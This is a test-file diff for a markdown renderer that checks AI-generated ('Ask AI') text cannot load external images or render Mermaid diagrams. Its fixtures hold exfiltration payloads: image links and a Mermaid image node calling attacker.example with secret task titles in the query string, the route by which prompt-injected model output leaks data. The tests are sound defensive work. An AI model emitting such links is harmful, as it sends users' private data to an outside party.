@@ -223,3 +223,74 @@ test('__text__ is underline with the option, also in a list, a quote and a table
   expect(other.querySelector('u')).toBeNull()
   expect(render(<div>{renderMarkdownBlocks('**x**', 'test', [], { chat: true })}</div>).container.querySelector('strong')?.textContent).toBe('x')
 })
+
+/** With the rules of model text (Ask AI). */
+function modelPreview(source: string) {
+  return render(<div>{renderMarkdownBlocks(source, 'test', [], { noExternalImages: true })}</div>)
+}
+
+test('model text loads no image from another origin, in any block', () => {
+  const view = modelPreview([
+    'Status ![ok](https://attacker.example/b.png?d=secret-task-titles) done',
+    '<img src="https://attacker.example/c.png?d=doc" alt="x">',
+    '- item ![badge](https://attacker.example/l.png?d=1)',
+    '> quote ![q](https://attacker.example/q.png?d=2)',
+    '| a |',
+    '|---|',
+    '| ![t](https://attacker.example/t.png?d=3) |',
+  ].join('\n'))
+  expect(view.container.querySelectorAll('img').length).toBe(0)
+  expect(view.container.querySelectorAll('[data-blocked-image]').length).toBe(5)
+  expect(view.container.textContent).toContain('image not loaded: ok – https://attacker.example/b.png?d=secret-task-titles')
+})
+
+test('model text still shows same-origin images, and links show their full address', () => {
+  const own = `${window.location.origin}/api/v1/files/1`
+  const view = modelPreview(`![own](${own}) and [click here](https://other.example/x?d=1)`)
+  expect(view.container.querySelector('img')?.getAttribute('src')).toBe(own)
+  const link = view.container.querySelector('a')
+  expect(link?.textContent).toBe('https://other.example/x?d=1')
+  expect(view.container.textContent).toContain('click here (')
+})
+
+test('other text keeps external images', () => {
+  const view = preview('![ok](https://example.com/b.png)')
+  expect(view.container.querySelectorAll('img').length).toBe(1)
+})
+
+// review 2: a Mermaid image node loads its image while the diagram is drawn (`new Image(); img.src = …`)
+const MERMAID_EXFIL = [
+  'flowchart TD',
+  '  A@{ img: "https://attacker.example/b.png?d=SECRET-TASK-TITLES", label: "status", pos: "t", h: 60, constraint: "on" }',
+].join('\n')
+
+test('model text draws no Mermaid diagram (an image node would load), tagged or detected', async () => {
+  const loads: string[] = []
+  const OriginalImage = globalThis.Image
+  globalThis.Image = class {
+    set src(value: string) {
+      loads.push(value)
+    }
+    decode() {
+      return Promise.resolve()
+    }
+  } as unknown as typeof Image
+  try {
+    for (const source of [`\`\`\`mermaid\n${MERMAID_EXFIL}\n\`\`\``, `\`\`\`\n${MERMAID_EXFIL}\n\`\`\``]) {
+      const view = modelPreview(`Here is the status diagram:\n${source}`)
+      expect(view.container.querySelector('[data-diagram]')).toBeNull()
+      expect(view.container.querySelector('svg image, image')).toBeNull()
+      expect(view.container.querySelector('pre')?.textContent).toContain('attacker.example/b.png')
+      view.unmount()
+    }
+    await new Promise((resolve) => setTimeout(resolve, 300))
+    expect(loads).toEqual([])
+  } finally {
+    globalThis.Image = OriginalImage
+  }
+})
+
+test('other text still draws Mermaid diagrams', () => {
+  const view = preview('```mermaid\nflowchart TD\n  A --> B\n```')
+  expect(view.container.querySelector('[data-diagram]')).not.toBeNull()
+})
